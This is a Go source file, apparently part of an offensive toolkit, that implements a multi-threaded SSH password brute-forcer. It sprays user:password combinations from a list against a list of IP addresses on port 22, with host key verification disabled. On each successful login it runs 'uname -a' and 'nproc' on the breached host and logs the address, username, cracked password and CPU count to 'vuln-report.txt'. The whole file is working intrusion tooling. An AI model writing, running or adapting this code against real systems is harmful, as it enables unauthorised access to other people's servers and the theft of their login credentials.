package bruteshed

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	ipfile     string
	usrpswlist string
	port       string = "22"
	ip         string
	threads    string
	timeouts   string
)

func SshBrute(userpasslist, iplist, threadcnt, timeout string) {
	usrpswlist = userpasslist
	threads = threadcnt
	ipfile = iplist
	timeouts = timeout
	runStrongArm()
}

func runStrongArm() { //main() {
	routinesCount, _ := strconv.Atoi(threads)
	runtime.GOMAXPROCS(routinesCount)

	var ips []string
	var combo [][]string
	var wg sync.WaitGroup

	lines, err := readLines(ipfile)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}

	ips = append(ips, lines...)
	lines2, err := readLines(usrpswlist)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}
	for _, line := range lines2 {
		s := strings.Split(line, ":")
		combo = append(combo, s)
	}

	//Licensing and warning
	timeoutAsInt, _ := strconv.Atoi(timeouts)
	for i, _ := range combo {
		if len(combo[i]) < 2 {
			fmt.Printf("Mistyped line #%v ( %q )\n", i, lines2[i])
		} else {
			//fmt.Printf("Attempting %v:%v on all target systems\n", combo[i][0], combo[i][1])
			for ix, _ := range ips {
				time.Sleep(1 * time.Millisecond)
				wg.Add(1)
				fmt.Printf("Attempting %v:%v against: %s\n", combo[i][0], combo[i][1], ips[ix])
				if runtime.NumGoroutine() < timeoutAsInt {
					go tryHost(combo[i][0], ips[ix], combo[i][1], "uname -a", &wg)
				} else {
					time.Sleep(5 * time.Second)
					go tryHost(combo[i][0], ips[ix], combo[i][1], "uname -a", &wg)
				}
			}
		}
	}
	time.Sleep(30 * time.Second)
	os.Exit(0)
}
func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {

		return nil, err
	}

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	file.Close()
	return lines, scanner.Err()
}

var sessions int

func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGroup) {
	i, _ := strconv.Atoi(timeouts)
	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout: time.Duration(i) * time.Second,
	}

	defer wg.Done()

	client, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), config)
	if err != nil {
		return
	} else {
		session, err := client.NewSession()
		if err != nil {
			log.Printf("Unable to gain a session on %s\nError: %s", addr, err.Error())
			return
		} else {
			sessions++
			log.Printf("Retrieved Sessions: %d", sessions)
		}

		var b bytes.Buffer
		session.Stdout = &b
		err = session.Run(cmd)
		session.Close()

		if err != nil {
			return
		}

		cmd1 := `nproc`

		session1, err := client.NewSession()

		if err != nil {
			return
		}

		var b1 bytes.Buffer
		session1.Stdout = &b1
		session1.Run(cmd1)
		session1.Close()

		if err != nil {
			return
		}

		client.Close()
		unamea := strings.Replace(b.String(), "\n", "", -1)
		cpus := strings.Replace(b1.String(), "\n", "", -1)
		if cpus == "" {
			cpus = "Invalid"
		}
		cp, _ := strconv.ParseInt(cpus, 10, 64)
		outs := "\nNetwork Details -> " + user + "@" + addr + ":" + port + "\nServer login password found -> " + pass + "\nOS Info -> " + unamea + "\nCPUs count -> " + cpus + "\n"
		if cp > 0 {
			f, err := os.OpenFile("vuln-report.txt",
				os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				log.Println(err)
			}

			if _, err := f.WriteString(outs); err != nil {
				log.Println(err)
			}
			f.Close()
			fmt.Printf("\nNetwork Details -> %v@%v:%v\nServer login password found -> %v\nOS Info -> %v\nCPUs count -> %v\n", user, addr, port, pass, unamea, cpus)
		}
	}

}
